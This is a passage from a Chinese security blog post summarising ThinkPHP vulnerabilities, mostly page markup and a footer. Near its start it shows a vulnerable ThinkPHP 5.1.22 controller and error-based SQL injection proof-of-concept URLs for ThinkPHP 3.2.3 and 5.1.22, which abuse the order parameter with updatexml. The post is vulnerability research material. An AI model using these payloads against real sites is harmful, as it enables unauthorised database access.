class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="ThinkPHP3-2-3-POC"><a href="#ThinkPHP3-2-3-POC" class="headerlink" title="ThinkPHP3.2.3 POC"></a>ThinkPHP3.2.3 POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul2&amp;order[updatexml(1,concat(0x3a,user()),1)]</span><br><span class="line">http://127.0.0.1/thinkphp323/index.php/Home/Index/sqlvul2?order[updatexml(1,concat(0x3a,user()),1)]</span><br></pre></td></tr></table></figure>
+<p><img src="/img/thinkphp_getshell/ThinkPHP_5.png"></p>
+<h3 id="ThinkPHP5-1-22漏洞测试代码"><a href="#ThinkPHP5-1-22漏洞测试代码" class="headerlink" title="ThinkPHP5.1.22漏洞测试代码"></a>ThinkPHP5.1.22漏洞测试代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$data=<span class="keyword">array</span>();</span><br><span class="line">$data[<span class="string">'username'</span>]=<span class="keyword">array</span>(<span class="string">'eq'</span>,<span class="string">'admin'</span>);</span><br><span class="line">$order=input(<span class="string">'get.order'</span>);<span class="comment">//使用input函数进行安全过滤</span></span><br><span class="line">$m=db(<span class="string">'user'</span>)-&gt;where($data)-&gt;order($order)-&gt;find();</span><br><span class="line">dump($m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="ThinkPHP5-1-22-POC"><a href="#ThinkPHP5-1-22-POC" class="headerlink" title="ThinkPHP5.1.22 POC"></a>ThinkPHP5.1.22 POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5/public/index/index/test/index?order[id`|updatexml(1,concat(0x3a,user()),1)%23]=1</span><br></pre></td></tr></table></figure>
+<p>参考:</p>
+<p><a href="http://www.lsablog.com/networksec/penetration/thinkphp5-rce-analysis/" target="_blank" rel="noopener">www.lsablog.com/networksec/penetration/thinkphp5-rce-analysis/</a><br><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2014-086737.html" target="_blank" rel="noopener">wooyun.jozxing.cc/static/bugs/wooyun-2014-086737.html</a><br><a href="https://xz.aliyun.com/t/125" target="_blank" rel="noopener"> xz.aliyun.com/t/125<br><a href="https://xz.aliyun.com/t/2631" target="_blank" rel="noopener">xz.aliyun.com/t/2631<br><a href="https://xz.aliyun.com/t/2257" target="_blank" rel="noopener">xz.aliyun.com/t/2257<br><a href="https://xz.aliyun.com/t/2812" target="_blank" rel="noopener">xz.aliyun.com/t/2812<br><a href="https://www.anquanke.com/post/id/104847" target="_blank" rel="noopener">www.anquanke.com/post/id/104847<br><a href="https://www.freebuf.com/vuls/185420.html" target="_blank" rel="noopener">www.freebuf.com/vuls/185420.html</a></a></a></a></a></a></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-07-23T07:45:25.821Z" itemprop="dateUpdated">2019-07-23 15:45:25</time>
+</span><br>
+
+
+        
+        转载注明来自<a href="/2019/01/21/ThinkPHP典型漏洞总结20190111/" target="_blank" rel="external">https://j2ekim.github.io/2019/01/21/ThinkPHP典型漏洞总结20190111/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="https://j2ekim.github.io">
+            <img src="/img/Avatar.jpg" alt="J2ekim">
+            J2ekim
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全-PHP/">Web安全 - PHP</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://j2ekim.github.io/2019/01/21/ThinkPHP典型漏洞总结20190111/&title=《ThinkPHP典型漏洞总结》 — j2ekim's Blog&pic=https://j2ekim.github.io/img/Avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://j2ekim.github.io/2019/01/21/ThinkPHP典型漏洞总结20190111/&title=《ThinkPHP典型漏洞总结》 — j2ekim's Blog&source=专注于打杂事业" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://j2ekim.github.io/2019/01/21/ThinkPHP典型漏洞总结20190111/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ThinkPHP典型漏洞总结》 — j2ekim's Blog&url=https://j2ekim.github.io/2019/01/21/ThinkPHP典型漏洞总结20190111/&via=https://j2ekim.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://j2ekim.github.io/2019/01/21/ThinkPHP典型漏洞总结20190111/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/03/27/InstallUtil&csc.exe-bypass application whitelisting/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">InstallUtil&amp;csc.exe-bypass application whitelisting</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2018/11/29/phpcms_2008_type_php-getshell/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">phpcms 2008 type.php 前台代码注入getshell漏洞分析</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>J2ekim &copy; 2017 - 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://j2ekim.github.io/2019/01/21/ThinkPHP典型漏洞总结20190111/&title=《ThinkPHP典型漏洞总结》 — j2ekim's Blog&pic=https://j2ekim.github.io/img/Avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://j2ekim.github.io/2019/01/21/ThinkPHP典型漏洞总结20190111/&title=《ThinkPHP典型漏洞总结》 — j2ekim's Blog&source=专注于打杂事业" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://j2ekim.github.io/2019/01/21/ThinkPHP典型漏洞总结20190111/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ThinkPHP典型漏洞总结》 — j2ekim's Blog&url=https://j2ekim.github.io/2019/01/21/ThinkPHP典型漏洞总结20190111/&via=https://j2ekim.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://j2ekim.github.io/2019/01/21/ThinkPHP典型漏洞总结20190111/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACtElEQVR42u3aQY7jMAwEwPz/07vAXgexuykzkwXKp2ASyCwdRA7F1yt+/vx7fn5+9+3PJ1knWe218eDh4eGNQm/Duv7Nu/Vnm/juXdcx4+Hh4W3z8gP6Oug2SVwHd5JU8PDw8L6B11awba2br4mHh4f3v/Dyg3vW4EiQeHh4eN/Da8vfva2ZNUQe6LXg4eHhxbyTC7Df+vyh+z08PDy88lY9TwbJ0d82F67fEkWLh4eHt8DLl26DmLVrzy/kXrOg8fDw8GJefvFfN0+DA/2kiI/ixMPDw1vgnVz257C2Edwmm5v0g4eHh/cor00MbZv1eoV8dCAfdcXDw8Pb5s0Gm86HombldZtO8PDw8PZ4+XhTHuJTQ1d50Y+Hh4f3Sd6shD0qbePSvN0aPDw8vG1ecrgnaaNNGLN6Py/T8fDw8PZ4+bVTHlZb+M7K5aTti4eHh7fBy4/4p1LCbBBh1vzFw8PD2+CdHO5FzjnYmoR0VEzj4eHhjXizUGbt17wpnDea69YGHh4e3gEvP+LbVJGPtBat2HiFOoPh4eHhlZXn7BrsqXSSN46T4vuxAQI8PDy84NLr2TSQlMtJiMm3b9l4eHh4C7z2pzksGThIOiWzZjEeHh7eHq99TducPdmOfGveromHh4e3zMsvsU7aFk8NDUQtEjw8PLw1Xv5vf/KXfE7hvNV78xc8PDy8Bd6sedpeR+XJph29wsPDw/s8b3aUP9VumG1EkWDw8PDwlnnJ07Z385GCPEUVG4qHh4e3wMufPKCTUa3Z72sMHh4e3jGvTQZ5O6Ad3ppdet1Ei4eHh7fGa6/5Tw73kzI9P//x8PDwvoHXvn520dUOENzEg4eHh/c1vJOW7klhnRfxeHh4eNu8tn3QDgfUTYQ4VdxsCh4eHt4C7+QC7OTarA2o3Xo8PDy8Bd5f9T1UueVOh6EAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="/js/main.min.js?v=1.7.2"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="/js/search.min.js?v=1.7.2" async></script>
+
+
+
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
